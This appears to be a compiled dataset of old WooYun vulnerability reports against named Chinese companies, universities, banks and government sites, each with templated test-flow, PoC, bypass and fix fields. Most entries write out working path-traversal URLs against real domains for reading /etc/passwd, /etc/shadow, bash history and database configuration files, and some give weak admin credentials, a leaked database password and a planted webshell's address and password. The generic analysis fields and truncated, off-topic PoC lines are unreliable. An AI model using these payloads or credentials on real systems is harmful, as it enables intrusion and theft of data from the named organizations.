**详情**: 漏洞网站：http://oa.superjia.com/读取root/.bash_history文件http://oa.superjia.com/js/extjs//examples/feed-viewer/feed-proxy.php?feed=http/../../../../../../../../../../../root/.bash_history读取/etc/passwd文件读取/oa/weaver/ecology/WEB-INF/prop/weaver.properties数据库连接文件http://oa.superjia.com/js/extjs//examples/feed-viewer/feed-proxy.php?feed=http/../../../../../../../../../../../oa/weaver/ecology/WEB-INF/prop/weav

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-064958] 中国林业网主站任意文件下载
**厂商**: 中国林业网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞网站http://www.forestry.gov.cn/下载链接http://www.forestry.gov.cn/DownloadFile.jsp?filename=../WEB-INF/struts/struts-config.xmlhttp://www.forestry.gov.cn/DownloadFile.jsp?filename=../DownloadFile.jsp

**POC**: 漏洞文件分析<%@page language="java" contentType="application/x-msdownload" import="java.io.*,java.net.*" pageEncoding="gb2312"%><%@ page import="com.futuresoftware.ccmbam.setting.AppConfig"%><%//关于文件下载时采用文件流输出的方式处理：//加上response.reset()，并且所有的％>后面不要换行，包括最后一个；//因为Application Server在处理编译jsp时对于％>和<％之间的内容一般是原样输

**绕过**: 直接利用

**修复**: 漏洞见上一个漏洞修复
---

---
### [wooyun-2014-055573] 双杨OA系统SQL注射+内部文件下载+官网中招
**厂商**: 上海双杨电脑高科技开发公司 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.为了彰显双杨OA系统的重量级，请访问：http://www.syc.com.cn/sys/Article/case/userlist/2.经测试，如下页面存在注射点：/help/HelpShowTip.aspx?helpid=13.以官网OA系统为例，注射点为：http://oa.syc.com.cn/OA/help/HelpShowTip.aspx?helpid=14.5.内部文件下载访问 /BianQian/ShowUp.aspx?ID=1 即可在未登录情况下下载内部文件。以双杨OA某客户为例，声明：本测试中得到的所有信息均已销毁。

**POC**: You just saw that, didn't you?

**绕过**: 直接利用

**修复**: Fix it right away.听说乌云奖金提现金额不能小于1000？这该如何是好！
---

---
### [wooyun-2014-066459] qibocmsV7整站系统任意文件下载导致无限制注入多处(可提升自己为管理 Demo演示)
**厂商**: 齐博CMS | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入, 认证接口, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bbs.qibosoft.com/down2.php?v=v7#down下载地址 刚下载的。在inc/job/download.php中$url=trim(base64_decode($url));$fileurl=str_replace($webdb[www_url],"",$url);if( eregi(".php",$fileurl) && is_file(ROOT_PATH."$fileurl") ){die("ERR");}if(!$webdb[DownLoad_readfile]){$fileurl=strstr($url,"://")?$url:tempdir($fileurl);header("location:$fileurl");exit;}if( is_file(ROOT_PATH."$fileurl") ){$filename=basename($fi

**POC**: 是不需要登录后台的 是在后台登录页面 等 其他多个地方注入。见上面。

**绕过**: 过滤绕过, 编码绕过

**修复**: 漏洞的源头是任意文件下载。过滤<等特殊字符。
---

---
### [wooyun-2015-0140816] 云南某电视台存在大量敏感信息泄露和心脏滴血漏洞等
**厂商**: 昆明广播电视台 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题站点：**.**.**.**1、目录遍历**.**.**.**/data/**.**.**.**/update/data/**.**.**.**/attachment/**.**.**.**/addons/db/.....2、敏感信息泄露感觉这个站点的所有数据库信息都泄露了（126个sql备份库）3、心脏滴血漏洞

**POC**: 1、目录遍历2、敏感信息泄露3、心脏滴血

**绕过**: 直接利用

**修复**: 目录访问权限最小化将openssl升级至最新版
---

---
### [wooyun-2015-0131413] 金蝶协同办公平台任意文件下载漏洞（无需登录）
**厂商**: 金蝶 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经测试发现，该系统存在任意文件下载，且无需登录存在漏洞的文件：/oa/admin/application/file_download.jsp?filePath=部分漏洞代码为：<%@ page import="java.util.Calendar,org.springside.core.Constants,cn.firstsoft.firstframe.admin.Environment"%><%String logPath = request.getParameter("filePath")==null?"D:\\KingdeeOA\\Tomcat_5.5\\logs\\catalina.2007-12-29.log ":request.getParameter("filePath");String contentType = request.getParameter("contentT

**POC**: 下载的文件

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2015-0149928] 民安某站点任意文件读取
**厂商**: 民安保险 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 央行网站敏感泄露某乐惨遭bypass之前有白帽子报过类似漏洞漏洞产生原因在这：http://zhanzhang.anquan.org/vul-detail/52fde4f64eb8d70df476ecb4/然后进入正题:http://e-policy.minanins.com/%c0%ae/WEB-INF/web.xmlhttp://e-policy.minanins.com/%c0%ae/WEB-INF/webContext.xml内部IP也泄露了。。还有这里:http://e-policy.minanins.com/%c0%ae/WEB-INF/web-servlet.xml

**POC**: 证明完毕

**绕过**: 直接利用

**修复**: 升级websphere
---

---
### [wooyun-2014-088187] PHPAPP注入第一枚（无视过滤）
**厂商**: PHPAPP | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com/member.php?app=2&action=40, 存在漏洞的文件在/phpapp/apps/member/member_phpapp.php下面分析一下漏洞产生的原因public function SetInfoAction(){$member=$this->GetMysqlOne('*',"".$this->GetTable('member')." WHERE  uid='$this->uid'");$usergroup=$member['usergroup'];include_once(APPS.

**POC**: 见 详细说明

**绕过**: 过滤绕过

**修复**: 完善dataTypeConvert方法
---

---
### [wooyun-2015-0115693] 中央企业某填报及管理系统问题打包
**厂商**: 国务院国资委外事局 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中央企业境外机构信息在线填报及管理系统系统地址：http://jwjg.sasac.gov.cn/login.jsp弱口令：SYSTEM/123456WAISHIJU/123456

**POC**: 文件下载http://jwjg.sasac.gov.cn/common/filedown.jsp?filePath=WEB-INF/web.xml系统其实还有命令执行,wooyun已提过，但未修复Target: http://jwjg.sasac.gov.cn/login.actionUseage: S2-016Whoami: dfyy-05\administratorWebPath: D:\jboss-4.0.5.GA-RJCMS\server\default\.\deploy\cefi.war\Target: http://jwjg.sasac.gov.cn/login.actionUse

**绕过**: 直接利用

**修复**: 强口令，补丁
---

---
### [wooyun-2014-055539] 某国防建设企业弱口令及目录遍历等问题致服务器沦陷
**厂商**: 中国核工业第二二建设有限公司 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国核工业第二二建设有限公司http://219.139.44.218:3000/先是各种目录遍历，比如这个文件夹下就放着好多小系统http://219.139.44.218:3000/temp/许多小系统的备份文件、源码、越权问题一大堆，随便就找到一个上传的地方，不过发现这里有一处弱口令http://219.139.44.218:3000/temp/cmis/admin/index.asp  admin  admin直接进去，就发现了数据库备份果断传图片一句话的马、用数据库备份变回来，中间上传的地方被删了，但是多找找还是有收获的，过程不表菜刀地址：http://219.139.44.218:3000/temp/cmis/admin/System/dbback/back.asp  密码pass里面有不少公司内部的oa、文件传阅、考试等系统进去之后数据库一连才发现里面那个考试系统最近还用的比

**POC**: 如上

**绕过**: 直接利用

**修复**: 全面检查
---

---
### [wooyun-2016-0170997] 海尔某业务系统任意文件下载漏洞数据库沦陷
**厂商**: 海尔集团 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载shadow文件http://homesecurity.haier.com/HaierAF/login4webapp/downLoadFile.action?filePath=/doc/../../../../../../../etc/shadow2、任意文件下载漏洞http://homesecurity.haier.com/HaierAF/login4webapp/downLoadFile.action?filePath=/doc/api.pdf filePath未过滤下载config-database.properties文件http://homesecurity.haier.com/HaierAF/login4webapp/downLoadFile.action?filePath=/doc/../WEB-INF/classes/config-database.properties

**POC**: #数据库oracle#dbDriver=oracle.jdbc.driver.OracleDriver#driverUrl=listenerconfig=/jdbmonitorconfig.xml:url=jdbc:oracle:thin:@127.0.0.1:1521:cloud#driver=com.cownew.JDBMonitor.jdbc.DBDriver#user=haier#password=haier#maximumActiveTime=30000#prototypeCount=5#maximumConnectionCount=200#minimumConnectionCoun

**绕过**: 直接利用

**修复**: 删除
---

---
### [wooyun-2015-0116906] 雅安市商业银行网银系统任意文件包含漏洞
**厂商**: 雅安市商业银行 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 具体漏洞原理不赘述了。地址：https://ebank.yaccb.cn/pweb/prelogin.do?_locale=zh_CN&BankId=9903&LoginType=C构造：

**POC**: 见漏洞详细说明。

**绕过**: 直接利用

**修复**: 联系开发商尽快修改架构和代码。
---

---
### [wooyun-2015-0138990] 某流通服务平台任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 去超市买肉看到一台“放心肉”查询终端，于是...回家后测试发现任意文件下载漏洞一枚，地址如下http://**.**.**.**/browser.do?browser=../../../../../../../../../../etc/passwd&method=downloadroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:

**POC**: 如上

**绕过**: 直接利用

**修复**: 参数过滤
---

---
### [wooyun-2014-086462] 哈工大人文学院存在任意文件下载漏洞
**厂商**: 哈工大 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 人文学院网址：http://shx.hit.edu.cn漏洞页面http://shx.hit.edu.cn/jsp/web/index/webDownload.do?inputPath=/WEB-INF/web.xml&filename=wooyun.txt

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤特殊字符
---
